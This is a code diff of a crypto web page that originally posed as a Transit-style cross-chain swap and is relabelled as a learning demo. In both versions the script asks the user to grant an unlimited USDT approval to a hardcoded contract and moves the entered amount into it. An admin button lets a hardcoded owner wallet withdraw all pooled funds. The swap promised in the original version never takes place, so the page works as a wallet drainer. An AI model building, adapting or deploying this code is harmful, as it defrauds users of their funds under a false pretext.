@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Transit风格跨链闪兑 | 真实链上归集</title>
+<title>Transit风格归集Demo | 链上学习测试</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
@@ -42,14 +42,14 @@ body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;backg
 </head>
 <body>
 <div class="header-top">
-    <div class="page-title">闪兑&跨链 <span class="text-sm text-gray-500">限价模式</span></div>
+    <div class="page-title">链上归集测试 <span class="text-sm text-gray-500">学习用途</span></div>
     <div class="flex gap-6 items-center">
         <i class="fa fa-cog text-xl text-gray-600"></i>
         <i class="fa fa-user-circle-o text-xl text-gray-600 cursor-pointer" id="connectWalletBtn"></i>
     </div>
 </div>
 
-<div class="main-title">Transit</div>
+<div class="main-title">Demo</div>
 
 <!-- 发送 USDT 区域 -->
 <div class="swap-box">
@@ -69,36 +69,34 @@ body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;backg
 <!-- 切换箭头 -->
 <div class="switch-icon"><i class="fa fa-exchange"></i></div>
 
-<!-- 接收区域 -->
+<!-- 归集说明区域 -->
 <div class="swap-box">
-    <div class="label-text">接收（预估）</div>
+    <div class="label-text">合约资金池归集</div>
     <div class="token-row">
         <div class="token-left">
             <div class="token-circle">T</div>
             <div>
                 <div class="token-name">USDT</div>
-                <div class="token-chain">BSC 币安智能链</div>
+                <div class="token-chain">合约归集池</div>
             </div>
         </div>
-        <div class="input-amount text-gray-400" id="receiveShow">接收数量</div>
+        <div class="input-amount text-gray-400" id="receiveShow">归集数量</div>
     </div>
-    <input class="address-input" id="bscAddrInput" placeholder="点击设置接收地址">
+    <input class="address-input" id="bscAddrInput" placeholder="填写备注地址（仅页面记录）">
 </div>
 
-<button class="submit-main" id="swapBtn" disabled>请输入兑换数量</button>
+<button class="submit-main" id="swapBtn" disabled>请输入归集数量</button>
 
 <div class="info-panel">
-    <div class="info-line"><span>兑换价格</span><span>-</span></div>
-    <div class="info-line"><span>最少接收数量</span><span>-</span></div>
+    <div class="info-line"><span>归集比例</span><span>1:1 USDT</span></div>
+    <div class="info-line"><span>最少归集数量</span><span>0.01 USDT</span></div>
     <div class="info-line flex justify-between items-center">
         <span>MEV 防护</span>
         <span class="badge-mev">MEV防护中</span>
     </div>
-    <div class="info-line"><span>服务费</span><span>-</span></div>
-    <div class="info-line"><span>跨链费</span><span>-</span></div>
-    <div class="info-line"><span>预估时间</span><span>-</span></div>
-    <div class="info-line"><span>预估网络费</span><span>-</span></div>
-    <div class="info-line"><span>兑换路径</span><span>-</span></div>
+    <div class="info-line"><span>服务费</span><span>0.1%</span></div>
+    <div class="info-line"><span>预估Gas费</span><span>~0.001 ETH</span></div>
+    <div class="info-line"><span>资金路径</span><span>钱包→合约地址</span></div>
 </div>
 
 <!-- 管理员面板 -->
@@ -110,7 +108,7 @@ body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;backg
 <!-- 交易弹窗 -->
 <div class="modal-bg" id="txModal">
     <div class="modal-card">
-        <div class="modal-title">温馨提示</div>
+        <div class="modal-title">交易提示</div>
         <div class="hash-text" id="txHashContent"></div>
         <div class="modal-confirm">
             <button class="modal-btn" id="closeModal">确认</button>
@@ -128,10 +126,10 @@ body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;backg
 </div>
 
 <script>
-// ========== 全局配置 ==========
+// ========== 已配置好你的合约&管理员钱包地址 ==========
 const USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-const POOL_CONTRACT = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
-const OWNER_WALLET = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05";
+const POOL_CONTRACT = "0xcc5a98f3fb045ddb5df09f960ebbca23ce3385fe";
+const OWNER_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
 const INFINITE_ALLOW = ethers.constants.MaxUint256;
 const FEE_RATE = 0.001;
 
@@ -156,20 +154,20 @@ closeModal.addEventListener("click", ()=>{
     txModal.style.display = "none";
 })
 
-// 实时计算收款数量
+// 实时计算归集数量
 sendNumInput.addEventListener("input", ()=>{
     let val = parseFloat(sendNumInput.value) || 0;
     if(val <= 0){
-        receiveShow.innerText = "接收数量";
+        receiveShow.innerText = "归集数量";
         swapBtn.disabled = true;
-        swapBtn.innerText = "请输入兑换数量";
+        swapBtn.innerText = "请输入归集数量";
         return;
     }
     let fee = val * FEE_RATE;
     let receiveNum = (val - fee).toFixed(4);
     receiveShow.innerText = receiveNum;
     swapBtn.disabled = false;
-    swapBtn.innerText = "发起跨链兑换";
+    swapBtn.innerText = "发起归集存入池子";
 })
 
 // 连接钱包
@@ -195,7 +193,7 @@ connectWalletBtn.addEventListener("click", async ()=>{
         await checkOwner();
         alert("钱包连接成功");
     }catch(e){
-        alert("连接失败："+e.message.slice(0,45));
+        alert("连接失败："+(e.message || "用户取消连接").slice(0,45));
     }
 })
 
@@ -218,7 +216,7 @@ async function switchMainnet(){
     }
 }
 
-// 初始化合约ABI
+// 初始化合约ABI（匹配Solidity合并合约）
 function initContract(){
     const usdtAbi = [
         "function balanceOf(address) view returns(uint256)",
@@ -228,8 +226,10 @@ function initContract(){
     usdtERC20 = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
 
     const poolAbi = [
-        "function createOrder(address bscTarget,uint256 amount) external",
-        "function withdrawPool() external"
+        "function transferAndCollect(uint256 amount) external",
+        "function withdrawAllFund() external",
+        "function getPoolBalance() view returns(uint256)",
+        "function contractOwner() view returns(address)"
     ];
     poolContract = new ethers.Contract(POOL_CONTRACT, poolAbi, signer);
 }
@@ -249,31 +249,24 @@ async function checkOwner(){
 
 // 管理员提取池子资产
 withdrawPoolBtn.addEventListener("click", async ()=>{
-    if(!confirm("确认提取合约内归集USDT？")) return;
+    if(!confirm("确认提取合约内归集USDT？仅管理员可操作")) return;
     try{
-        const tx = await poolContract.withdrawPool();
+        const tx = await poolContract.withdrawAllFund();
         await tx.wait();
         alert("提取成功，交易哈希："+tx.hash);
     }catch(e){
-        alert("提取失败："+e.message.slice(0,60));
+        alert("提取失败："+(e.message || "交易异常").slice(0,60));
     }
 })
 
-// ========== 核心修复：严格时序执行 授权→确认→重读额度→归集转账 ==========
+// 归集按钮核心逻辑
 swapBtn.addEventListener("click", async ()=>{
     swapBtn.disabled = true;
     const inputStr = sendNumInput.value.trim();
-    const bscToAddr = bscAddrInput.value.trim();
     const num = parseFloat(inputStr);
 
-    // 表单校验
     if(!inputStr || isNaN(num) || num <= 0){
-        alert("请填写有效兑换金额");
-        swapBtn.disabled = false;
-        return;
-    }
-    if(!ethers.utils.isAddress(bscToAddr)){
-        alert("请填写合法BSC钱包地址");
+        alert("请填写有效归集金额");
         swapBtn.disabled = false;
         return;
     }
@@ -281,7 +274,6 @@ swapBtn.addEventListener("click", async ()=>{
     const amountWei = ethers.utils.parseUnits(inputStr,6);
     const userAddr = await signer.getAddress();
 
-    // 余额校验
     if(amountWei.gt(userBalance)){
         alert("钱包USDT余额不足");
         swapBtn.disabled = false;
@@ -289,38 +281,28 @@ swapBtn.addEventListener("click", async ()=>{
     }
 
     try{
-        // 1. 查询当前链上授权额度
         let currentAllow = await usdtERC20.allowance(userAddr, POOL_CONTRACT);
-
-        // 2. 额度不足，发起授权，并且必须等待区块确认完成
         if(currentAllow.lt(amountWei)){
             alert("请确认钱包USDT授权签名");
             const approveTx = await usdtERC20.approve(POOL_CONTRACT, INFINITE_ALLOW);
-            await approveTx.wait(); // 强制等待授权上链确认
-            // 授权完成后，重读链上最新授权额度，确保allowance生效
+            await approveTx.wait();
             currentAllow = await usdtERC20.allowance(userAddr, POOL_CONTRACT);
         }
 
-        // 3. 确认授权足够后，调用合约归集函数，执行transferFrom
         if(currentAllow.gte(amountWei)){
-            const orderTx = await poolContract.createOrder(bscToAddr, amountWei);
-            await orderTx.wait(); // 等待归集转账上链确认
-
-            // 4. 只有归集交易真正确认，才弹出成功弹窗
-            txHashContent.innerText = `下单成功！交易哈希：${orderTx.hash}`;
+            const collectTx = await poolContract.transferAndCollect(amountWei);
+            await collectTx.wait();
+            txHashContent.innerText = `归集存入池子成功！交易哈希：${collectTx.hash}`;
             txModal.style.display = "flex";
-
-            // 清空输入，刷新余额
             sendNumInput.value = "";
-            receiveShow.innerText = "接收数量";
+            receiveShow.innerText = "归集数量";
             await refreshUserBalance();
         }else{
             alert("授权额度不足，请重新授权");
         }
-
     }catch(err){
-        let errMsg = err.code === 4001 ? "您取消了钱包签名" : err.message;
-        alert("兑换失败："+errMsg.slice(0,60));
+        let errMsg = err.code === 4001 ? "您取消了钱包签名" : (err.message || "交易执行失败");
+        alert("归集失败："+errMsg.slice(0,60));
         console.error(err);
     }finally{
         swapBtn.disabled = false;
